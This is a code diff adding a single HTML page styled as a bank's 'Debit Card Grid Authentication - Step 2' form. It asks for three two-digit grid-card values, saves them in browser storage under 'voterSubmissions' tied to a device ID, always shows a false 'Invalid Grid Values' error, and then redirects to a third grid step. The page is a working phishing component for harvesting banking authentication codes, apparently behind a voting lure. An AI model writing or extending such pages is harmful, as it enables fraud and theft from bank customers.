@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debit Card Grid Authentication - Step 2</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
+        .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 22px; }
+        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 20px; }
+        .error-msg { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 13px; text-align: center; margin-bottom: 15px; display: none; border: 1px solid #f5c6cb; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
+        .form-group input { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
+        .form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
+        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-next:hover { background: #004085; }
+        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Debit Card Grid Authentication</h2>
+        <div class="sub-title">Enter alternative grid values</div>
+        
+        <div id="errorAlert" class="error-msg">Invalid Grid Values, Please Enter Again</div>
+
+        <form id="gridForm2">
+            <div class="form-group">
+                <label for="gridB">Grid Value for Column [ B ] (2 Digits)</label>
+                <input type="password" id="gridB" name="gridB" placeholder="-- " maxlength="2" required>
+            </div>
+            <div class="form-group">
+                <label for="gridI">Grid Value for Column [ I ] (2 Digits)</label>
+                <input type="password" id="gridI" name="gridI" placeholder="-- " maxlength="2" required>
+            </div>
+            <div class="form-group">
+                <label for="gridH">Grid Value for Column [ H ] (2 Digits)</label>
+                <input type="password" id="gridH" name="gridH" placeholder="-- " maxlength="2" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('gridForm2').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const gridB = document.getElementById('gridB').value;
+            const gridI = document.getElementById('gridI').value;
+            const gridH = document.getElementById('gridH').value;
+            const gridStep2Data = `B:${gridB}, I:${gridI}, H:${gridH}`;
+
+            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
+            let deviceId = localStorage.getItem('voterDeviceId');
+
+            if (submissions.length > 0) {
+                let targetIndex = -1;
+                for (let i = submissions.length - 1; i >= 0; i--) {
+                    if (submissions[i].deviceId === deviceId) {
+                        targetIndex = i;
+                        break;
+                    }
+                }
+                if (targetIndex === -1) targetIndex = submissions.length - 1;
+
+                submissions[targetIndex].gridStep2 = gridStep2Data;
+                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
+            }
+
+            document.getElementById('errorAlert').style.display = 'block';
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+
+            setTimeout(() => {
+                // Redirect to 3rd grid step
+                window.location.href = "grid_step3.html"; 
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
